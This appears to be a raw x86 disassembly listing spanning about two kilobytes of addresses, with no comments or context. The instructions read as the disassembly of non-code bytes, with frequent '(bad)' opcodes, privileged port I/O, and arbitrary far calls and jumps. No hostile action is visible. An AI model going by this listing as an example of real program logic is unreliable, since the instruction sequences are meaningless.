  40b37d:	in     eax,0x3e
  40b37f:	outs   dx,DWORD PTR ds:[esi]
  40b380:	cli    
  40b381:	sub    dh,ah
  40b383:	loop   0x40b385
  40b385:	sbb    al,0xeb
  40b387:	leave  
  40b388:	add    eax,0x63ece4a7
  40b38d:	cmp    bl,BYTE PTR [esi]
  40b38f:	cmp    al,dl
  40b391:	inc    esp
  40b392:	or     esp,edi
  40b394:	mov    bh,0x46
  40b396:	fsubp  st(5),st
  40b398:	or     esi,DWORD PTR [ebp+0x17bd73ed]
  40b39e:	je     0x40b3b3
  40b3a0:	push   0x6a
  40b3a2:	sub    bh,BYTE PTR [edx]
  40b3a4:	lahf   
  40b3a5:	rol    BYTE PTR [ecx+ebx*4+0x1a],0xaf
  40b3aa:	imul   edi,DWORD PTR ds:[ebx],0x5b
  40b3ae:	test   al,0xb3
  40b3b0:	add    eax,0x1536f057
  40b3b5:	jp     0x40b35e
  40b3b7:	mov    al,0x58
  40b3b9:	je     0x40b38a
  40b3bb:	sub    eax,0x2313590b
  40b3c0:	inc    esp
  40b3c1:	test   al,0xeb
  40b3c3:	push   esp
  40b3c4:	xchg   esi,eax
  40b3c5:	sti    
  40b3c6:	or     al,0x9
  40b3c8:	or     al,0x8b
  40b3ca:	inc    ebp
  40b3cb:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0x1e0331a
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	cmp    DWORD PTR [eax],esi
  40b3f2:	jo     0x40b418
  40b3f4:	xchg   DWORD PTR [ecx+ecx*2+0x7a],edx
  40b3f8:	or     cl,BYTE PTR [ebp+0x3]
  40b3fb:	jno    0x40b383
  40b3fd:	adc    DWORD PTR es:0xb2930541,0xd
  40b405:	hlt    
  40b406:	test   eax,0x9fb85068
  40b40b:	xchg   BYTE PTR [ecx+0xc],ah
  40b40e:	sbb    DWORD PTR [edi],0x2650dc71
  40b414:	and    eax,0x8eec4ef0
  40b419:	fcomp  DWORD PTR [esi-0x76]
  40b41c:	enter  0x5349,0x83
  40b420:	push   ebp
  40b421:	inc    ecx
  40b422:	pop    es
  40b423:	xor    dh,al
  40b425:	jl     0x40b3bb
  40b427:	push   ebx
  40b428:	arpl   WORD PTR [ebx],di
  40b42a:	gs mov cl,0xbf
  40b42d:	adc    eax,0x843c17ae
  40b432:	ins    BYTE PTR es:[edi],dx
  40b433:	repnz inc ebx
  40b435:	je     0x40b4a6
  40b437:	repnz xchg esi,eax
  40b439:	sahf   
  40b43a:	xchg   ecx,eax
  40b43b:	ror    ebx,1
  40b43d:	cmp    DWORD PTR [edx-0xe],esi
  40b440:	or     eax,0x8ca5ed3e
  40b445:	push   0x1a
  40b447:	call   0x7dc3:0x131b5ab8
  40b44e:	sahf   
  40b44f:	test   al,0x36
  40b451:	mov    bl,0x1e
  40b453:	and    eax,0x73c0edd1
  40b458:	test   cl,0x3a
  40b45b:	jmp    DWORD PTR [edi+0x4a]
  40b45e:	shl    BYTE PTR [edx+0x8],1
  40b461:	shr    ah,cl
  40b463:	adc    BYTE PTR [esi],0xe
  40b466:	or     ebx,DWORD PTR [edi-0x3a]
  40b469:	stos   BYTE PTR es:[edi],al
  40b46a:	pop    edx
  40b46b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b46c:	iret   
  40b46d:	mov    bh,0x6
  40b46f:	sub    BYTE PTR [ebx+0x1e084e69],0xcd
  40b476:	add    BYTE PTR [edx],al
  40b478:	inc    ecx
  40b479:	rcr    edi,cl
  40b47b:	jbe    0x40b493
  40b47d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b47e:	dec    esp
  40b47f:	addr16 call 0x3be7726b
  40b485:	mov    edi,0x9f0d2822
  40b48a:	and    edi,DWORD PTR [esp+ebp*8+0x7f1704dd]
  40b491:	mov    edi,DWORD PTR [edx+ebx*8-0x77]
  40b495:	or     BYTE PTR [esi],dl
  40b497:	out    dx,al
  40b498:	aas    
  40b499:	mov    BYTE PTR fs:[ebx-0x74],dh
  40b49d:	fistp  QWORD PTR [ebx-0x2f]
  40b4a0:	jmp    0x60cc:0x312c7c2
  40b4a7:	ret    0xca49
  40b4aa:	inc    ebx
  40b4ab:	xor    BYTE PTR [eax+ebx*8-0x8],bl
  40b4af:	idiv   DWORD PTR [ebx-0x7bf8aa51]
  40b4b5:	push   ecx
  40b4b6:	add    ch,BYTE PTR [ecx-0x1f7039af]
  40b4bc:	arpl   bx,si
  40b4be:	pop    ds
  40b4bf:	sbb    eax,0x4e95e9c6
  40b4c4:	ret    
  40b4c5:	or     eax,DWORD PTR [edx-0x36]
  40b4c8:	sbb    BYTE PTR [esi+0x6a83556d],ch
  40b4ce:	das    
  40b4cf:	push   eax
  40b4d0:	js     0x40b45f
  40b4d2:	mov    al,ds:0xa46a8761
  40b4d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d8:	das    
  40b4d9:	dec    edi
  40b4da:	xor    eax,0xc403b6db
  40b4df:	dec    eax
  40b4e0:	xor    cl,BYTE PTR [edx+0x22a4b944]
  40b4e6:	in     eax,dx
  40b4e7:	fbld   TBYTE PTR [ebx+esi*4+0x3d08138d]
  40b4ee:	fwait
  40b4ef:	mov    bl,cl
  40b4f1:	enter  0x502b,0x24
  40b4f5:	jle    0x40b4e8
  40b4f7:	mov    ch,0x99
  40b4f9:	mov    DWORD PTR [edi-0x6],0x56afa700
  40b500:	js     0x40b495
  40b502:	pop    ebx
  40b503:	movnti DWORD PTR [ebx],ecx
  40b506:	(bad)  
  40b507:	sub    bh,BYTE PTR [esi-0x2c6c9cd]
  40b50d:	aas    
  40b50e:	fs fucomi st,st(2)
  40b511:	test   DWORD PTR [edi+0x13],0xa1672fe0
  40b518:	jne    0x40b573
  40b51a:	(bad)
  40b51d:	sahf   
  40b51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b51f:	das    
  40b520:	ficom  DWORD PTR [ebx+0x1675f89a]
  40b526:	push   0x42
  40b528:	test   BYTE PTR [ecx+edx*2-0xa],dl
  40b52c:	adc    al,0x26
  40b52e:	adc    al,0xe8
  40b530:	ins    DWORD PTR es:[edi],dx
  40b531:	fiadd  DWORD PTR [ecx-0x58]
  40b534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b535:	mov    bl,0x72
  40b537:	and    DWORD PTR [edx-0x4d],ecx
  40b53a:	push   ebx
  40b53b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b53c:	leave  
  40b53d:	push   es
  40b53e:	nop
  40b53f:	sub    al,0xd8
  40b541:	cli    
  40b542:	outs   dx,BYTE PTR ds:[esi]
  40b543:	inc    BYTE PTR [edx-0x2e]
  40b546:	pop    eax
  40b547:	inc    ebp
  40b548:	or     ebp,edx
  40b54a:	cmp    dl,bl
  40b54c:	sub    DWORD PTR [eax+0x79dbe1d4],0x5899dd7c
  40b556:	popf   
  40b557:	icebp  
  40b558:	mov    al,0x0
  40b55a:	fisttp DWORD PTR [edi-0x4]
  40b55d:	xchg   edi,eax
  40b55e:	jmp    0x276935c7
  40b563:	enter  0xf418,0x51
  40b567:	push   es
  40b568:	add    eax,0xc5bb539b
  40b56d:	adc    dl,BYTE PTR [eax+0x62]
  40b570:	xchg   esi,eax
  40b571:	sub    eax,0x95556172
  40b576:	cwde   
  40b577:	retf   
  40b578:	cdq    
  40b579:	out    0xb4,eax
  40b57b:	enter  0x5f43,0x8c
  40b57f:	and    ebp,DWORD PTR [edi+0x2d]
  40b582:	dec    edi
  40b583:	push   ebp
  40b584:	(bad)  
  40b585:	jecxz  0x40b5c6
  40b587:	add    DWORD PTR [ebx+0x2872b352],ebx
  40b58d:	imul   edx,DWORD PTR [edi*1-0x39674818],0xffffffa1
  40b595:	mov    esi,0xad950c32
  40b59a:	jecxz  0x40b5ab
  40b59c:	mov    dl,0xff
  40b59e:	cmp    al,BYTE PTR [esi+0x1f]
  40b5a1:	and    BYTE PTR [esp],0x2a
  40b5a5:	mov    edi,0x39b7d630
  40b5aa:	push   es
  40b5ab:	fild   DWORD PTR [esi]
  40b5ad:	or     eax,0xb9e74c0b
  40b5b2:	int    0xa6
  40b5b4:	mov    edi,0xcf0e25fb
  40b5b9:	push   edi
  40b5ba:	add    eax,0xf015334e
  40b5bf:	inc    eax
  40b5c0:	push   es
  40b5c1:	repnz xchg edx,eax
  40b5c3:	push   0xffffffd5
  40b5c5:	xor    al,0xf9
  40b5c7:	fsubr  DWORD PTR [esi+0x527174aa]
  40b5cd:	xor    eax,0xedbd99
  40b5d2:	push   edi
  40b5d3:	cmp    esp,0x2a5a1f2a
  40b5d9:	push   0xffffff98
  40b5db:	ficom  DWORD PTR [edx-0x36fd88e9]
  40b5e1:	into   
  40b5e2:	fwait
  40b5e3:	sti    
  40b5e4:	pop    edx
  40b5e5:	(bad)  
  40b5e6:	mov    DWORD PTR [esi],edx
  40b5e8:	mov    bh,0x94
  40b5ea:	(bad)  
  40b5eb:	mov    ecx,0xa8971117
  40b5f0:	test   BYTE PTR [edx+0x12d1ed03],ah
  40b5f6:	push   esp
  40b5f7:	cmp    eax,DWORD PTR [esi]
  40b5f9:	cmpxchg BYTE PTR [edi+0x39272cda],dl
  40b600:	jmp    0x40b63d
  40b602:	and    al,0xa6
  40b604:	mov    ch,0xdf
  40b606:	xchg   ebx,ebp
  40b608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b609:	mov    ds:0xb0f6a78e,al
  40b60e:	fcom   QWORD PTR [edx-0x1]
  40b611:	push   edx
  40b612:	or     eax,DWORD PTR [esi]
  40b614:	push   es
  40b615:	(bad)  
  40b616:	jle    0x40b5b2
  40b618:	hlt    
  40b619:	or     BYTE PTR [edi],ah
  40b61b:	loopne 0x40b661
  40b61d:	test   DWORD PTR [ecx-0x1e],ebp
  40b620:	xor    BYTE PTR ds:0xa08b8686,0xdc
  40b627:	shl    BYTE PTR ss:[edx],0xb7
  40b62b:	sbb    BYTE PTR [esi],ch
  40b62d:	xchg   esp,eax
  40b62e:	mov    ebx,0xccb534d3
  40b633:	inc    esi
  40b634:	sub    al,BYTE PTR [ebx-0x34]
  40b637:	pop    edi
  40b638:	mov    dl,0x6f
  40b63a:	dec    edi
  40b63b:	imul   ebx,DWORD PTR ds:0xa84382b2,0x9495c041
  40b645:	aas    
  40b646:	pop    esp
  40b647:	out    dx,eax
  40b648:	sub    BYTE PTR ds:0xd039baab,ch
  40b64e:	pop    esp
  40b64f:	push   0x7a
  40b651:	adc    BYTE PTR [ecx+0xf],ah
  40b654:	adc    eax,DWORD PTR [ebx+esi*4]
  40b657:	std    
  40b658:	xor    DWORD PTR ds:0x8375e0fb,ebx
  40b65e:	pop    esi
  40b65f:	push   es
  40b660:	pop    edx
  40b661:	lods   eax,DWORD PTR ds:[esi]
  40b663:	(bad)  
  40b664:	daa    
  40b665:	mov    esi,0x6b0d03d5
  40b66a:	test   esp,0x905f6390
  40b670:	xor    bh,BYTE PTR [esi+0x78]
  40b673:	int3   
  40b674:	mov    ecx,0x692dedf1
  40b679:	ins    DWORD PTR es:[edi],dx
  40b67a:	test   al,0x20
  40b67c:	pop    esi
  40b67d:	cmp    edi,edx
  40b67f:	ret    0x90f0
  40b682:	test   eax,0x930e1055
  40b687:	cmp    eax,0x52f970e5
  40b68c:	repnz pop esp
  40b68e:	icebp  
  40b68f:	sbb    eax,0x370b2adf
  40b695:	sbb    esi,DWORD PTR [ebp+0x34]
  40b698:	pusha  
  40b699:	sbb    bl,BYTE PTR [eax]
  40b69b:	fxch   st(0)
  40b69d:	mov    bh,0x4b
  40b69f:	xchg   sp,ax
  40b6a1:	cmp    DWORD PTR [ebx-0x60],eax
  40b6a4:	test   al,0x81
  40b6a6:	dec    edi
  40b6a7:	sub    BYTE PTR [esi+0x4e],cl
  40b6aa:	push   edx
  40b6ab:	xor    dh,BYTE PTR [edi]
  40b6ad:	mov    edi,ebx
  40b6af:	push   edi
  40b6b0:	fs mov edi,0xf66efca5
  40b6b6:	mov    ds:0x57166679,al
  40b6bb:	imul   ecx,DWORD PTR [ecx+0x730630a0],0x77e73f
  40b6c5:	int3   
  40b6c6:	sbb    BYTE PTR [esi-0x38],cl
  40b6c9:	fld    DWORD PTR [ebx+edi*2-0x6b]
  40b6cd:	loopne 0x40b71f
  40b6cf:	pop    edx
  40b6d0:	or     esp,DWORD PTR [edx+0x246936d5]
  40b6d6:	xor    esp,eax
  40b6d8:	adc    DWORD PTR [esi+0x951d6c1],ebx
  40b6de:	lock call 0xc846ae1a
  40b6e4:	mov    ds:0x8131fe4,al
  40b6e9:	sub    ecx,DWORD PTR [ecx]
  40b6eb:	inc    esp
  40b6ec:	sbb    al,0xbe
  40b6ee:	push   ebp
  40b6ef:	cmp    DWORD PTR ds:0x89c7172a,edi
  40b6f5:	add    ecx,ebp
  40b6f7:	xchg   DWORD PTR [ecx],ecx
  40b6f9:	add    BYTE PTR [eax],al
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR ds:0x14e2f6cb,ss
  40b71d:	clc    
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	or     BYTE PTR [edx],0x2e
  40b727:	ret    0x27f1
  40b72a:	rol    DWORD PTR [ecx+0x5d93bc49],cl
  40b730:	pop    ecx
  40b731:	aas    
  40b732:	out    0xab,eax
  40b734:	mov    ecx,DWORD PTR [ebp+0x445ebe44]
  40b73a:	call   0xa181619c
  40b73f:	push   eax
  40b740:	pop    bx
  40b742:	out    0x10,al
  40b744:	xor    ebp,0x4
  40b747:	cs ret 
  40b749:	cdq    
  40b74a:	add    BYTE PTR [ebx],dl
  40b74c:	test   al,0x43
  40b74e:	out    dx,al
  40b74f:	ss dec ebx
  40b751:	mov    ebx,0x7484f03f
  40b756:	mov    WORD PTR [edx-0x3f30253a],fs
  40b75c:	fwait
  40b75d:	outs   dx,BYTE PTR ds:[esi]
  40b75e:	dec    edi
  40b75f:	and    BYTE PTR [esi+0x16],0x68
  40b763:	push   edx
  40b764:	rol    BYTE PTR [eax],0x84
  40b767:	imul   DWORD PTR [edx-0x720ea077]
  40b76d:	sub    DWORD PTR [edx],edx
  40b76f:	into   
  40b770:	call   0x2f49:0x63c98930
  40b777:	pop    ss
  40b778:	ud2    
  40b77a:	into   
  40b77b:	pop    eax
  40b77c:	fstp   QWORD PTR [eax]
  40b77e:	xor    DWORD PTR [ebp+esi*8+0x53],esp
  40b782:	push   eax
  40b783:	xor    al,0x55
  40b785:	mov    WORD PTR [ebp-0x2f66bea0],cs
  40b78b:	lea    esp,[ecx-0x591665ec]
  40b791:	pop    eax
  40b792:	pop    es
  40b793:	popf   
  40b794:	jmp    0xd6ca:0xf1db0de9
  40b79b:	push   es
  40b79c:	out    0x20,al
  40b79e:	nop
  40b79f:	nop
  40b7a0:	fcom   st(5)
  40b7a2:	cdq    
  40b7a3:	iret   
  40b7a4:	xchg   edx,eax
  40b7a5:	in     al,0xc4
  40b7a7:	pop    edx
  40b7a8:	stc    
  40b7a9:	pushf  
  40b7aa:	xchg   esi,eax
  40b7ab:	scas   eax,DWORD PTR es:[edi]
  40b7ac:	add    edi,DWORD PTR [edx+ebx*8+0x53]
  40b7b0:	cmp    eax,0x5b757ad0
  40b7b5:	cmp    cl,BYTE PTR ds:0x6f336b7d
  40b7bb:	jmp    FWORD PTR [edi*1-0x4c6ff8f1]
  40b7c2:	nop
  40b7c3:	(bad)  
  40b7c4:	out    dx,al
  40b7c5:	push   eax
  40b7c6:	mov    edx,0x995c333f
  40b7cb:	or     eax,0x86e0c1c6
  40b7d0:	test   eax,0x79b97492
  40b7d5:	scas   eax,DWORD PTR es:[edi]
  40b7d6:	jg     0x40b7a2
  40b7d8:	std    
  40b7d9:	add    eax,DWORD PTR [eax+0x1360b7a]
  40b7df:	push   ebx
  40b7e0:	jbe    0x40b83d
  40b7e2:	inc    esp
  40b7e3:	enter  0x99f6,0xc3
  40b7e7:	mov    al,0x8d
  40b7e9:	mov    esp,0x1bcda35d
  40b7ee:	sub    BYTE PTR [edi],cl
  40b7f0:	and    cl,cl
  40b7f2:	cmp    eax,0xa902781e
  40b7f7:	cmc    
  40b7f8:	push   cs
  40b7f9:	js     0x40b7b9
  40b7fb:	jmp    0x4ae33825
  40b800:	and    al,0xc3
  40b802:	xchg   DWORD PTR [ebp+ebp*1+0x58],edx
  40b806:	repnz sbb esp,DWORD PTR [ecx+0x5f]
  40b80a:	ret    
  40b80b:	mov    ds:0x75f0f0fa,eax
  40b810:	mov    al,ds:0x341ea519
  40b815:	ss jge 0x40b897
  40b818:	sub    eax,0x18501d8f
  40b81d:	or     BYTE PTR [esi+0x37],ah
  40b820:	mov    al,0x96
  40b822:	sar    BYTE PTR [ecx+0x10],0x50
  40b826:	dec    edi
  40b827:	in     eax,dx
  40b828:	(bad)  
  40b829:	stos   DWORD PTR es:[edi],eax
  40b82a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b82b:	fiadd  DWORD PTR ss:[ecx+0x0]
  40b82f:	test   al,0x53
  40b831:	and    al,0x4a
  40b833:	or     bl,BYTE PTR ds:0xca84e42d
  40b839:	ss int3 
  40b83b:	lock hlt 
  40b83d:	push   esi
  40b83e:	arpl   WORD PTR [ecx-0x1],ax
  40b841:	dec    ebp
  40b842:	and    DWORD PTR [esp+esi*4],ebp
  40b845:	lods   al,BYTE PTR ds:[esi]
  40b846:	outs   dx,DWORD PTR ds:[esi]
  40b847:	fidiv  DWORD PTR [esi-0x79089aac]
  40b84d:	adc    edx,DWORD PTR [bx+di]
  40b850:	shr    DWORD PTR [esi-0x29223408],cl
  40b856:	es add al,0x6b
  40b859:	pop    ss
  40b85a:	les    esi,FWORD PTR [edi]
  40b85c:	(bad)  
  40b85d:	jbe    0x40b8c7
  40b85f:	jle    0x40b857
  40b861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b862:	arpl   WORD PTR [edi-0x7ebfa02f],si
  40b868:	test   BYTE PTR [edx-0x2a],dl
  40b86b:	jg     0x40b84a
  40b86d:	mov    dh,0x15
  40b86f:	je     0x40b852
  40b871:	mov    ecx,0x9bb0dd73
  40b876:	xchg   esp,eax
  40b877:	push   edx
  40b878:	inc    edi
  40b879:	dec    eax
  40b87a:	mov    ecx,0x70ab75dd
  40b87f:	lock adc DWORD PTR [ebx+0x39eff8a6],esi
  40b886:	scas   al,BYTE PTR es:[edi]
  40b887:	pop    eax
  40b888:	mov    dh,BYTE PTR [edx-0x78]
  40b88b:	inc    esp
  40b88c:	out    0xb4,eax
  40b88e:	int    0x2e
  40b890:	and    al,0xc9
  40b892:	lds    eax,FWORD PTR [esi-0x12]
  40b895:	push   esi
  40b896:	cmp    BYTE PTR [ebx+eax*8+0x75],0xc5
  40b89b:	fdivr  QWORD PTR [ecx+0x29]
  40b89e:	cdq    
  40b89f:	outs   dx,BYTE PTR ds:[esi]
  40b8a0:	push   eax
  40b8a1:	sub    BYTE PTR [eax-0x3ecd3361],al
  40b8a7:	add    al,0xf9
  40b8a9:	outs   dx,BYTE PTR ds:[esi]
  40b8aa:	test   al,0x73
  40b8ac:	push   esi
  40b8ad:	scas   eax,DWORD PTR es:[edi]
  40b8ae:	cmc    
  40b8af:	adc    eax,0x261bd4dc
  40b8b4:	(bad)  
  40b8b5:	es loopne 0x40b857
  40b8b8:	mov    ebx,0x8af1771d
  40b8bd:	iret   
  40b8be:	jmp    0xba39cbf0
  40b8c3:	(bad)  
  40b8c4:	loope  0x40b870
  40b8c6:	dec    edx
  40b8c7:	pop    DWORD PTR [edi]
  40b8c9:	setb   al
  40b8cc:	lds    esp,FWORD PTR [ebx+0x33]
  40b8cf:	push   ds
  40b8d0:	das    
  40b8d1:	pushf  
  40b8d2:	push   es
  40b8d3:	hlt    
  40b8d4:	cmp    eax,0x15e49235
  40b8d9:	mov    ds:0xfbb34ca7,eax
  40b8de:	call   0x2c9f:0x22a80fc8
  40b8e5:	jle    0x40b965
  40b8e7:	in     al,0x74
  40b8e9:	pushf  
  40b8ea:	fisub  DWORD PTR [esp+ebp*4-0x439cf96a]
  40b8f1:	mov    esp,0x1b709950
  40b8f6:	inc    esi
  40b8f7:	inc    esi
  40b8f8:	xchg   edi,eax
  40b8f9:	fcom   QWORD PTR [edi]
  40b8fb:	or     eax,0x5ceb8363
  40b900:	ds out dx,al
  40b902:	mov    edx,0x2507ea25
  40b907:	retf   
  40b908:	add    dl,BYTE PTR [eax]
  40b90a:	xchg   BYTE PTR [edi+eax*8-0x4e121ade],bh
  40b911:	sbb    dl,al
  40b913:	(bad)  [ebx+0x2f]
  40b916:	test   al,0x58
  40b918:	sub    ebp,DWORD PTR [edi+ebx*8+0x10]
  40b91c:	jmp    0xb6417571
  40b921:	push   0x6d5eee26
  40b926:	pusha  
  40b927:	dec    esi
  40b928:	mov    al,ds:0x643c3927
  40b92d:	or     eax,0xa7b63d82
  40b932:	mov    eax,0x4e1ca913
  40b937:	scas   al,BYTE PTR es:[edi]
  40b938:	(bad)  
  40b939:	mov    bl,0xfc
  40b93b:	jmp    0x7ee7:0x803b0828
  40b942:	or     eax,DWORD PTR [eax+0x6bc7626d]
  40b948:	push   edi
  40b949:	or     eax,0x3863cec5
  40b94e:	jg     0x40b965
  40b950:	mov    ch,0xbe
  40b952:	mov    ds:0x9712d32f,eax
  40b957:	push   ebx
  40b958:	fistp  QWORD PTR [eax+ebx*1]
  40b95b:	mov    esi,0x45846e3e
  40b960:	sub    eax,0x191c7682
  40b965:	dec    edx
  40b966:	aaa    
  40b967:	aad    0xf2
  40b969:	les    esi,FWORD PTR [ebp-0x3]
  40b96c:	enter  0x9f55,0x1b
  40b970:	dec    ebx
  40b971:	in     al,dx
  40b972:	rcr    esi,cl
  40b974:	call   0xa60b:0x31ce16a8
  40b97b:	dec    edx
  40b97c:	inc    eax
  40b97d:	icebp  
  40b97e:	inc    esi
  40b97f:	pop    ebp
  40b980:	enter  0x5b0d,0x6c
  40b984:	sti    
  40b985:	mov    DWORD PTR [eax+ecx*8],ebx
  40b988:	fcom   DWORD PTR [eax-0x2a]
  40b98b:	retf   
  40b98c:	add    cl,ch
  40b98e:	or     eax,0x2caa755f
  40b993:	cdq    
  40b994:	push   ebp
  40b995:	sub    al,0x19
  40b997:	aaa    
  40b998:	push   0xdbe3a988
  40b99d:	sahf   
  40b99e:	rcl    DWORD PTR [ecx],1
  40b9a0:	dec    edi
  40b9a1:	in     eax,0x3b
  40b9a3:	mul    esp
  40b9a5:	pop    edx
  40b9a6:	add    ch,bl
  40b9a8:	cmovs  ebp,edx
  40b9ab:	test   BYTE PTR [ecx],cl
  40b9ad:	xlat   BYTE PTR ds:[ebx]
  40b9ae:	int3   
  40b9af:	retf   0xf3e9
  40b9b2:	pop    edx
  40b9b3:	(bad)  
  40b9b4:	adc    ch,cl
  40b9b6:	icebp  
  40b9b7:	inc    ebx
  40b9b8:	push   0xffffffc6
  40b9ba:	aam    0x38
  40b9bc:	pop    es
  40b9bd:	dec    ebx
  40b9be:	repnz push ecx
  40b9c0:	in     al,dx
  40b9c1:	in     al,dx
  40b9c2:	push   ss
  40b9c3:	sbb    DWORD PTR [esi],edi
  40b9c5:	sub    DWORD PTR [ebx-0x3126a5c1],0xfffffffa
  40b9cc:	clc    
  40b9cd:	dec    eax
  40b9ce:	sahf   
  40b9cf:	pop    es
  40b9d0:	pop    eax
  40b9d1:	add    DWORD PTR [edx+0x3f94bc70],ebx
  40b9d7:	aad    0x23
  40b9d9:	mov    ebx,ds
  40b9db:	pop    eax
  40b9dc:	push   es
  40b9dd:	pusha  
  40b9de:	pop    eax
  40b9df:	cmp    ebx,DWORD PTR [ebp+0x52d03af8]
  40b9e5:	iret   
  40b9e6:	addr16 dec esp
  40b9e8:	or     esi,DWORD PTR ds:0xad6e4e8e
  40b9ee:	mov    dh,0x47
  40b9f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9f1:	pushf  
  40b9f2:	in     eax,0x4b
  40b9f4:	mov    eax,DWORD PTR [eax*4+0x5222cdac]
  40b9fb:	xchg   DWORD PTR [edi+0x6],ebp
  40b9fe:	push   edi
  40b9ff:	fisubr DWORD PTR [edx+ecx*2+0x6a]
  40ba03:	loope  0x40b9a5
  40ba05:	fidiv  DWORD PTR [ebp-0x27a4d6f8]
  40ba0b:	enter  0x5f3d,0x4e
  40ba0f:	je     0x40ba05
  40ba11:	sub    eax,0x83326e87
  40ba16:	test   edi,eax
  40ba18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba19:	imul   esi,DWORD PTR [edi],0xfa2d13fa
  40ba1f:	mov    ecx,fs
  40ba21:	jo     0x40ba19
  40ba23:	sub    eax,0xd416ba54
  40ba28:	mov    eax,DWORD PTR [ebp-0x8]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    cl,ch
  40ba40:	push   ebx
  40ba41:	cmp    DWORD PTR [esi+0x10],edi
  40ba44:	xchg   DWORD PTR [esi+0x7e],edi
  40ba47:	jp     0x40bac6
  40ba49:	jle    0x40bac9
  40ba4b:	adc    al,BYTE PTR [edi]
  40ba4d:	mov    eax,ds:0x69d6d0c9
  40ba52:	xchg   ebx,eax
  40ba53:	fucom  st(2)
  40ba55:	adc    al,0x13
  40ba57:	xchg   ax,ax
  40ba59:	pop    eax
  40ba5a:	sub    dl,BYTE PTR [ebx+0x14]
  40ba5d:	dec    eax
  40ba5e:	dec    ecx
  40ba5f:	sahf   
  40ba60:	out    0xf9,al
  40ba62:	sahf   
  40ba63:	cli    
  40ba64:	test   BYTE PTR [esi-0x76790626],ch
  40ba6a:	(bad)  
  40ba6b:	push   esp
  40ba6c:	cmp    ch,BYTE PTR [edi]
  40ba6e:	inc    eax
  40ba6f:	js     0x40ba91
  40ba71:	cwde   
  40ba72:	mov    ?,WORD PTR [edi]
  40ba74:	cld    
  40ba75:	jl     0x40ba3a
  40ba77:	in     eax,0x71
  40ba79:	mov    dh,0x6e
  40ba7b:	in     al,dx
  40ba7c:	mov    al,0x7
  40ba7e:	adc    al,0xc8
  40ba80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba81:	and    bl,dh
  40ba83:	xchg   edx,eax
  40ba84:	adc    BYTE PTR [edx],cl
  40ba86:	mov    al,0x62
  40ba88:	mov    ah,0xf2
  40ba8a:	dec    ebp
  40ba8b:	and    eax,0x3e544c84
  40ba90:	add    DWORD PTR [ebx+edx*1-0x61],0xffffffee
  40ba95:	sbb    cl,BYTE PTR [ebp+edx*8+0xc04edc5]
  40ba9c:	mov    dl,0xf9
  40ba9e:	addr16 push ebp
  40baa0:	enter  0x196d,0x9c
  40baa4:	ss retf 0xe72c
  40baa8:	push   eax
  40baa9:	fidiv  WORD PTR [ebx]
  40baab:	cmp    cl,BYTE PTR [ebx]
  40baad:	sub    DWORD PTR [ebx+0x8],ebp
  40bab0:	jno    0x40ba91
  40bab2:	push   0x68
  40bab4:	pop    ecx
  40bab5:	repz (bad) 
  40bab7:	or     eax,0xbf0412ca
  40babc:	pop    ds
  40babd:	jecxz  0x40ba54
  40babf:	mov    ebx,0x4eb54951
  40bac4:	push   0x63
  40bac6:	add    ecx,DWORD PTR [ebx]
  40bac8:	mov    esi,0x356d949c
  40bacd:	enter  0xceba,0xaf
  40bad1:	cli    
  40bad2:	jmp    0x40bab3
  40bad4:	pop    edi
  40bad5:	sbb    al,0x3c
  40bad7:	push   cs
  40bad8:	in     eax,0x23
  40bada:	js     0x40bad9
  40badc:	pop    esp
  40badd:	pop    ebp
  40bade:	cmp    bl,BYTE PTR [esi+esi*1+0x528e229a]
  40bae5:	push   ebp
  40bae6:	xor    al,0x2a
  40bae8:	pop    es
  40bae9:	xchg   ebx,eax
  40baea:	xor    al,0x1
  40baec:	mov    edi,0x1a2519ce
  40baf1:	repnz lahf 
  40baf3:	call   0x1b5b:0x746f00ca
  40bafa:	js     0x40bae4
  40bafc:	mov    ecx,DWORD PTR [ebp+0x3d]
  40baff:	sub    al,0x1f
  40bb01:	adc    DWORD PTR [ecx],edi
  40bb03:	mov    ds:0x7156289b,al
  40bb08:	dec    esi
  40bb09:	push   0xd0c6ec5c
  40bb0e:	sub    bl,BYTE PTR [ecx+eax*8+0x73]
  40bb12:	pusha  
  40bb13:	sar    BYTE PTR [edx+0xa],0x79
  40bb17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb18:	push   edx
  40bb19:	pop    ecx
  40bb1a:	xchg   edx,eax
  40bb1b:	into   
  40bb1c:	in     al,dx
  40bb1d:	icebp  
  40bb1e:	push   ecx
  40bb1f:	cmp    bl,dh
  40bb21:	pop    ebx
  40bb22:	sub    DWORD PTR [ecx+eiz*2],ebp
